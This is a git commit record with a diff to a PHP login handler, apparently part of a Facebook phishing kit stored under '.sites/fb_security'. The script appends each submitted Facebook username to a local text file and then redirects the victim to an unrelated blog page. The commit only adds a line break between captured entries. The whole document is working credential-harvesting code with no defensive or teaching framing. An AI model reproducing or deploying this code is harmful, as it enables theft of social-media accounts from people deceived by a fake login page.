3ba32d4c7b855a0768b36106556bc74baf0c0f63
Mahfuz <11mahfuzrahman148@gmail.com>
2022-04-08 22:01:32 +0600

    update1

--- .sites/fb_security/login.php
+++ .sites/fb_security/login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username'], FILE_APPEND);
+file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username']."\n", FILE_APPEND);
 header('Location: https://mahfuzphero.github.io/blogging-page-2/');
 exit();
 ?>
